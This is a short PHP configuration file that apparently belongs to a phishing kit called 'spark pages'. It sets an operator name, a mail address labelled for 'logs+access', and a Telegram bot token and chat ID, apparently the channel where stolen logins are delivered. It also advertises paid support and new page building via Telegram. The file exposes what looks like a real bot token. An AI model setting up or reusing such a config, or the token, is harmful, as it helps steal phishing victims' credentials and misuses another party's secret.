<?php
// spark pages require
/// contact me for your suppprt and building of new pages
//Telegram : @jk_bek

// AUTH INFO

$Name = "SPARK";
$mail = "spark@yandex.com"; // logs+access
$telegram_bot_api="5513064426:AAHIflVMlls8-GwS9Z2TD6OGFj7yFurbCOI";
$telegram_chat_id="5691618668";



?>